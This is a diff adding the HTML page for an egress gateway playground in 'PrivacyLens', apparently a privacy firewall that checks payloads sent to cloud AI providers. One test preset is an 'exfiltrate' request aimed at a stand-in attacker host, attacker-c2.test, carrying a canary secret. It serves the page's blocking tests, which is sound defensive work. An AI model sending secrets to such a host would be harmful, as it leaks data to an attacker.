@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Fail-Closed Egress Gateway — PrivacyLens 2.0</title>
+  
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Instrument+Serif:ital@0;1&family=Manrope:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+  
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+  <div class="ambient-blur ambient-top-right"></div>
+  <div class="ambient-blur ambient-bottom-left"></div>
+
+  <!-- Shared Top Navigation Header (Same-Tab Multi-Page Links) -->
+  <header class="app-header">
+    <a href="/" class="brand">
+      <div class="brand-mark">P</div>
+      <div class="brand-text">
+        <div class="brand-title">PrivacyLens</div>
+        <div class="brand-subtitle">PS-004 AI Privacy Firewall</div>
+      </div>
+    </a>
+
+    <!-- Multi-Page Navigation Bar -->
+    <ul class="nav-links">
+      <li><a href="/" class="nav-link">Live Scanner</a></li>
+      <li><a href="/proof-lab.html" class="nav-link">Privacy Proof Lab</a></li>
+      <li><a href="/gateway.html" class="nav-link active" style="color: var(--primary); font-weight: 700;">Egress Gateway</a></li>
+      <li><a href="/approvals.html" class="nav-link">Approval Center</a></li>
+      <li><a href="/events.html" class="nav-link">Live Events</a></li>
+    </ul>
+
+    <div class="nav-cta-group">
+      <div class="trust-badge-pill">
+        <span class="pulse-dot"></span>
+        Fail-Closed Armed
+      </div>
+    </div>
+  </header>
+
+  <main class="proof-lab-section" style="padding-top: 130px;">
+    <div class="lab-header-banner">
+      <div class="hero-pill-badge" style="margin-bottom: 14px;">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+        Centralized Egress Security Gateway
+      </div>
+      <h1 class="section-heading-serif">Fail-Closed <em>Egress Gateway.</em></h1>
+      <p style="color: var(--text-muted); max-width: 760px; margin: 0 auto; font-size: 1.125rem;">
+        Every outbound request passing to external cloud AI providers must pass through this authoritative check. Payloads containing unmasked secrets, active canaries, or prompt injection exfiltrations are blocked instantly.
+      </p>
+    </div>
+
+    <!-- Gateway Control & Validation Sandbox -->
+    <div class="card" style="margin-bottom: 32px; border-left: 5px solid var(--primary);">
+      <div class="card-header">
+        <div class="card-title">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg>
+          Outbound Payload Validation Playground (POST /api/egress/validate)
+        </div>
+        <span class="badge badge-primary">LIVE GATEWAY ENDPOINT</span>
+      </div>
+
+      <div style="padding: 20px 0 10px;">
+        <label style="font-size: 0.875rem; font-weight: 600; color: var(--secondary); margin-bottom: 8px; display: block;">
+          Test Payload to Transmit to Cloud AI:
+        </label>
+        <textarea id="egress-payload-input" rows="4" style="width: 100%; box-sizing: border-box; padding: 14px 18px; font-family: var(--font-mono); font-size: 0.875rem; border-radius: var(--radius-sm); border: 1.5px solid #CBD5E1; background: #FFFFFF; color: var(--secondary); outline: none; resize: vertical;">{"action": "type", "element": "#card-number", "value": "[CARD_1]"}</textarea>
+
+        <!-- Test Presets -->
+        <div style="display: flex; gap: 8px; align-items: center; margin: 12px 0 18px; flex-wrap: wrap;">
+          <span style="font-size: 0.75rem; font-weight: 700; color: var(--text-muted); text-transform: uppercase;">Test Presets:</span>
+          <button class="btn btn-sm btn-outline btn-egress-preset" data-text='{"action": "type", "element": "#card-number", "value": "[CARD_1]"}'>Clean Sanitized Token (Pass)</button>
+          <button class="btn btn-sm btn-outline btn-egress-preset" data-text='{"action": "type", "element": "#card-number", "value": "4529 7025 3275 9417"}'>Raw Unmasked Card (Block)</button>
+          <button class="btn btn-sm btn-outline btn-egress-preset" data-text='{"action": "type", "element": "#aadhaar-input", "value": "4357 9307 3000"}'>Raw Unmasked Aadhaar (Block)</button>
+          <button class="btn btn-sm btn-outline btn-egress-preset" data-text='{"action": "exfiltrate", "target": "https://attacker-c2.test/exfiltrate", "secret": "DEMO_CANARY_VAULT_KEY"}'>Canary Secret Injection (Block)</button>
+        </div>
+
+        <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px;">
+          <button class="btn btn-primary" id="btn-validate-egress">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            Validate Outgoing Payload
+          </button>
+          <button class="btn btn-outline" id="btn-clear-vault">
+            Purge In-Memory Vault
+          </button>
+        </div>
+      </div>
+
+      <!-- Decision Card -->
+      <div id="egress-decision-card" style="display: none; margin-top: 24px; padding-top: 20px; border-top: 1px solid var(--border-subtle);">
+        <div class="verdict-banner" id="egress-verdict-banner"></div>
+        <div style="margin-top: 16px;">
+          <div style="font-size: 0.8125rem; font-weight: 700; color: var(--secondary); margin-bottom: 8px;">Detailed Gateway Diagnostic Response:</div>
+          <pre class="code-box" id="egress-response-raw" style="max-height: 200px;"></pre>
+        </div>
+      </div>
+    </div>
+
+    <!-- Live In-Memory Vault Inspector -->
+    <div class="card" style="margin-bottom: 32px;">
+      <div class="card-header">
+        <div class="card-title">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          In-Memory RAM Vault Status (Volatile Storage • 0 Disk Writes)
+        </div>
+        <span class="badge badge-success" id="vault-token-badge">0 Tokens</span>
+      </div>
+      <div style="padding: 16px 0;">
+        <div style="font-size: 0.875rem; color: var(--text-muted); line-height: 1.6;">
+          Tokens are allocated in ephemeral RAM during the session. Surrounding text is preserved while credentials never write to disk or persist in logs.
+        </div>
+        <div style="display: flex; gap: 16px; margin-top: 16px;">
+          <div class="kpi-card" style="flex: 1;">
+            <div class="kpi-label">Active Tokens</div>
+            <div class="kpi-value text-primary" id="kpi-vault-tokens">0</div>
+            <div class="kpi-sub">In-Memory Mappings</div>
+          </div>
+          <div class="kpi-card" style="flex: 1;">
+            <div class="kpi-label">Payloads Blocked</div>
+            <div class="kpi-value text-danger" id="kpi-vault-blocked">0</div>
+            <div class="kpi-sub">Egress Hard Blocks</div>
+          </div>
+          <div class="kpi-card" style="flex: 1;">
+            <div class="kpi-label">Disk Writes</div>
+            <div class="kpi-value text-success">0</div>
+            <div class="kpi-sub">Strict RAM Boundary</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const payloadInput = document.getElementById("egress-payload-input");
+      const btnValidate = document.getElementById("btn-validate-egress");
+      const btnClearVault = document.getElementById("btn-clear-vault");
+      const decisionCard = document.getElementById("egress-decision-card");
+      const verdictBanner = document.getElementById("egress-verdict-banner");
+      const responseRaw = document.getElementById("egress-response-raw");
+      const presetButtons = document.querySelectorAll(".btn-egress-preset");
+      const kpiTokens = document.getElementById("kpi-vault-tokens");
+      const kpiBlocked = document.getElementById("kpi-vault-blocked");
+      const tokenBadge = document.getElementById("vault-token-badge");
+
+      // Presets
+      presetButtons.forEach(btn => {
+        btn.addEventListener("click", () => {
+          const t = btn.getAttribute("data-text");
+          if (payloadInput && t) payloadInput.value = t;
+        });
+      });
+
+      // Validate Egress
+      btnValidate.addEventListener("click", async () => {
+        const text = payloadInput.value.trim();
+        if (!text) return alert("Please enter payload text.");
+
+        btnValidate.disabled = true;
+        btnValidate.innerText = "Evaluating Gateway Security...";
+
+        try {
+          const resp = await fetch("/api/egress/validate", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ payload: text, canary_test: true })
+          });
+          const data = await resp.json();
+
+          decisionCard.style.display = "block";
+          responseRaw.innerText = JSON.stringify(data, null, 2);
+
+          if (data.status === "CLEARED" || data.passed) {
+            verdictBanner.className = "verdict-banner verdict-allowed";
+            verdictBanner.innerHTML = `
+              <span><strong>EGRESS GATEWAY: CLEARED (ALLOWED)</strong> • Outgoing payload is sanitized and clean. Safe to transmit to external AI.</span>
+              <span class="badge badge-success">TRANSMISSION ALLOWED</span>
+            `;
+          } else {
+            verdictBanner.className = "verdict-banner verdict-blocked";
+            verdictBanner.innerHTML = `
+              <span><strong>EGRESS GATEWAY: BLOCKED</strong> • ${data.violations_count || 1} Leaks Intercepted. Outgoing transmission halted.</span>
+              <span class="badge badge-danger">TRANSMISSION HALTED</span>
+            `;
+          }
+          syncStats();
+        } catch (e) {
+          alert(`Gateway Error: ${e.message}`);
+        } finally {
+          btnValidate.disabled = false;
+          btnValidate.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg> Validate Outgoing Payload`;
+        }
+      });
+
+      // Clear Vault
+      btnClearVault.addEventListener("click", async () => {
+        await fetch("/vault/clear", { method: "POST" });
+        alert("In-Memory Vault successfully cleared. All token mappings purged from RAM.");
+        syncStats();
+      });
+
+      async function syncStats() {
+        try {
+          const res = await fetch("/dashboard/stats");
+          const d = await res.json();
+          if (kpiTokens) kpiTokens.innerText = d.active_vault_tokens || 0;
+          if (tokenBadge) tokenBadge.innerText = `${d.active_vault_tokens || 0} Tokens`;
+          if (kpiBlocked) kpiBlocked.innerText = d.payloads_blocked || 0;
+        } catch (e) {}
+      }
+
+      syncStats();
+      setInterval(syncStats, 3000);
+    });
+  </script>
+</body>
+</html>
